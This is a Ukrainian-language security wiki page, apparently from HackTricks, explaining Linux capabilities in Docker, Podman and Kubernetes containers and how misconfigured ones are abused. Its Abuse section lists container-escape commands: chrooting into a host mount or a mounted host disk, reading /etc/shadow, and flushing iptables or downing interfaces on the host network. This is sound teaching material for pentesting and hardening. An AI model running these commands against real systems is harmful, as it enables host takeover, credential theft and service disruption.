# Можливості Linux у контейнерах

{{#include ../../../../banners/hacktricks-training.md}}

## Огляд

Linux capabilities — одна з найважливіших складових безпеки контейнерів, бо вона відповідає на тонке, але фундаментальне питання: **що насправді означає "root" всередині контейнера?** На звичайній системі Linux UID 0 історично означав дуже широкий набір привілеїв. У сучасних ядрах цей привілей розбитий на менші одиниці, звані capabilities. Процес може виконуватися як root і при цьому не мати багатьох потужних операцій, якщо відповідні capabilities були вилучені.

Контейнери сильно покладаються на це розмежування. Багато робочих навантажень все ще запускаються як UID 0 всередині контейнера з міркувань сумісності або простоти. Без скасування capabilities це було б надто небезпечно. При скасуванні capabilities процес root у контейнері все ще може виконувати багато звичайних внутрішніх завдань, водночас йому заборонено виконувати більш чутливі операції ядра. Ось чому shell у контейнері, який показує `uid=0(root)`, не означає автоматично "root на хості" або навіть "широкі привілеї ядра". Набори capabilities визначають, скільки ця root-ідентичність насправді варта.

For the full Linux capability reference and many abuse examples, see:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Принцип роботи

Capabilities відстежуються в кількох наборах, включно з permitted, effective, inheritable, ambient і bounding sets. Для багатьох оцінок безпеки контейнерів точні семантики ядра для кожного набору менш негайно важливі, ніж практичне питання: **яких привілей цієї процес може успішно досягти зараз, і яких майбутніх підвищень привілеїв ще можливо досягти?**

Це важливо, бо багато технік виходу з контейнера насправді є проблемами capabilities, замаскованими під проблеми контейнера. Робоче навантаження з `CAP_SYS_ADMIN` може отримати доступ до величезної кількості функціональності ядра, до якої звичайний root у контейнері не мав би доступу. Робоче навантаження з `CAP_NET_ADMIN` стає набагато небезпечнішим, якщо воно також ділиться мережею хоста. Робоче навантаження з `CAP_SYS_PTRACE` стає набагато цікавішим, якщо воно може бачити процеси хоста через спільний простір PID хоста. У Docker або Podman це може виглядати як `--pid=host`; у Kubernetes це зазвичай з'являється як `hostPID: true`.

Іншими словами, набір capabilities не можна оцінювати ізольовано. Його потрібно читати разом із namespaces, seccomp та MAC policy.

## Лабораторія

Дуже простий спосіб перевірити capabilities всередині контейнера такий:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Ви також можете порівняти більш обмежений контейнер із контейнером, у якого додані всі capabilities:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Щоб побачити ефект вузького додавання, спробуйте видалити все й додати назад тільки одну capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Ці невеликі експерименти показують, що середовище виконання не просто перемикає булеве значення під назвою "privileged". Воно формує реальну поверхню привілеїв, доступну процесу.

## High-Risk Capabilities

Хоча багато capabilities можуть мати значення залежно від цілі, кілька з них постійно є релевантними при аналізі container escape.

**`CAP_SYS_ADMIN`** — це те, до чого захисникам слід ставитися з найбільшою підозрою. Його часто описують як «новий root», бо він відкриває величезну кількість функціональності, включно з операціями, пов’язаними з mount, поведінкою, чутливою до namespace, та багатьма шляхами в ядрі, які ніколи не повинні бути випадково відкриті для контейнерів. Якщо контейнер має `CAP_SYS_ADMIN`, слабкий seccomp і відсутнє сильне MAC-припинення, багато класичних шляхів втечі стають набагато реалістичнішими.

**`CAP_SYS_PTRACE`** має значення, коли існує видимість процесів, особливо якщо PID namespace спільний з хостом або з цікавими сусідніми workload-ами. Воно може перетворити видимість на можливість втручання.

**`CAP_NET_ADMIN`** і **`CAP_NET_RAW`** важливі в мережево орієнтованих середовищах. На ізольованій bridge-мережі вони можуть вже бути ризиковими; на спільному host network namespace це набагато гірше, бо workload може переналаштувати хостове мережеве середовище, прослуховувати, спуфити або перешкоджати локальним потокам трафіку.

**`CAP_SYS_MODULE`** зазвичай катастрофічний у середовищі з root-доступом, бо завантаження kernel modules фактично означає контроль над хостовим ядром. Воно майже ніколи не має з’являтися в контейнерному workload для загального призначення.

## Runtime Usage

Docker, Podman, containerd-based stacks і CRI-O усі використовують контроль capabilities, але значення за замовчуванням та інтерфейси управління відрізняються. Docker явно відкриває їх через прапори типу `--cap-drop` і `--cap-add`. Podman надає подібні контролі і часто отримує користь від rootless execution як додаткового рівня безпеки. Kubernetes робить видимими додавання і вилучення capabilities через Pod або container `securityContext`. System-container середовища, такі як LXC/Incus, також залежать від контролю capabilities, але більш глибока інтеграція з хостом у цих системах часто спокушає операторів послаблювати значення за замовчуванням агресивніше, ніж вони б зробили в app-container середовищі.

Той самий принцип діє у всіх них: capability, яку технічно можна надати, не обов’язково має бути надана. Багато реальних інцидентів починаються тоді, коли оператор додає capability просто тому, що workload не працював у більш суворій конфігурації і команді потрібен був швидкий фікс.

## Misconfigurations

Найочевидніша помилка — **`--cap-add=ALL`** у Docker/Podman-подібних CLI, але це не єдина. На практиці більш поширена проблема — надати одну або дві надзвичайно потужні capabilities, особливо `CAP_SYS_ADMIN`, щоб "запустити додаток", не розуміючи при цьому наслідків для namespace, seccomp і mount. Інший поширений режим відмови — поєднання додаткових capabilities зі спільними namespace хоста. У Docker або Podman це може виглядати як `--pid=host`, `--network=host` або `--userns=host`; у Kubernetes еквівалентне розкриття зазвичай з’являється через налаштування workload-у, такі як `hostPID: true` або `hostNetwork: true`. Кожне з таких поєднань змінює те, на що capability фактично може впливати.

Також часто адміністратори вважають, що оскільки workload не повністю `--privileged`, він таки має значуще обмеження. Іноді це правда, але іноді ефективна позиція вже настільки близька до privileged, що це розрізнення операційно перестає мати значення.

## Abuse

Перший практичний крок — перелічити фактичний набір capabilities і негайно протестувати capability-специфічні дії, які мали б значення для втечі або доступу до інформації хоста:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Якщо присутній `CAP_SYS_ADMIN`, спочатку перевірте mount-based abuse та host filesystem access, оскільки це один із найпоширеніших breakout enablers:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Якщо `CAP_SYS_PTRACE` присутній і контейнер може бачити цікаві процеси, перевірте, чи можна цю capability перетворити на інспекцію процесів:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Якщо `CAP_NET_ADMIN` або `CAP_NET_RAW` присутні, перевірте, чи може робоче навантаження маніпулювати видимим мережевим стеком або принаймні збирати корисну мережеву розвідку:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
Коли перевірка capability проходить успішно, поєднайте її зі станом namespace. Capability, який видається лише ризикованим в ізольованому namespace, може негайно перетворитися на escape або host-recon primitive, якщо container також розділяє host PID, host network або host mounts.

### Повний приклад: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Якщо container має `CAP_SYS_ADMIN` і записуваний bind mount файлової системи хоста, наприклад `/host`, шлях escape часто буває простим:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Якщо `chroot` вдасться, команди тепер виконуватимуться в контексті кореневої файлової системи хоста:
```bash
id
hostname
cat /etc/shadow | head
```
Якщо `chroot` недоступний, той самий результат часто можна досягти, викликавши binary через змонтоване дерево:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Повний приклад: `CAP_SYS_ADMIN` + доступ до пристрою

Якщо блочний пристрій із хоста доступний у контейнері, `CAP_SYS_ADMIN` може перетворити його на прямий доступ до файлової системи хоста:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Повний приклад: `CAP_NET_ADMIN` + хостова мережа

Ця комбінація не завжди безпосередньо забезпечує root на хості, але може повністю переналаштувати мережевий стек хоста:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Це може дозволити denial of service, traffic interception або доступ до сервісів, які раніше були відфільтровані.

## Перевірки

Мета capability checks — не лише вивести сирі значення, а й зрозуміти, чи має процес достатні привілеї, щоб зробити його поточну namespace і mount ситуацію небезпечною.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Що тут цікаво:

- `capsh --print` — найпростіший спосіб помітити високоризикові можливості, такі як `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, або `cap_sys_module`.
- Рядок `CapEff` у `/proc/self/status` показує, що фактично ефективно зараз, а не лише те, що може бути доступним в інших наборах.
- Дамп можливостей стає набагато важливішим, якщо контейнер також ділиться з хостом PID, network або user namespaces, або має змонтовані на запис файлові системи хоста.

Після збору сирої інформації про можливості, наступний крок — інтерпретація. Запитайте, чи процес має root, чи активні user namespaces, чи поділені host namespaces, чи seccomp застосовується, і чи AppArmor або SELinux все ще обмежують процес. Набір можливостей сам по собі — лише частина історії, але часто саме він пояснює, чому один container breakout працює, а інший зазнає невдачі при однакових початкових умовах.

## Налаштування середовища виконання за замовчуванням

| Runtime / platform | Default state | Default behavior | Common manual weakening |
| --- | --- | --- | --- |
| Docker Engine | За замовчуванням зменшений набір можливостей | Docker зберігає список дозволених можливостей за замовчуванням і відкидає решту | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | За замовчуванням зменшений набір можливостей | Контейнери Podman за замовчуванням без привілеїв і використовують зменшену модель можливостей | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Наслідує значення runtime за замовчуванням, якщо не змінено | Якщо не вказано `securityContext.capabilities`, контейнер отримує набір можливостей за замовчуванням від runtime | `securityContext.capabilities.add`, відсутність `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Зазвичай значення runtime за замовчуванням | Ефективний набір залежить від runtime плюс Pod spec | те саме, що й у рядку Kubernetes; пряма конфігурація OCI/CRI також може явно додавати можливості |

Для Kubernetes важливий момент: API не визначає один універсальний набір можливостей за замовчуванням. Якщо Pod не додає або не видаляє можливості, робоче навантаження успадковує значення runtime за замовчуванням для цього вузла.
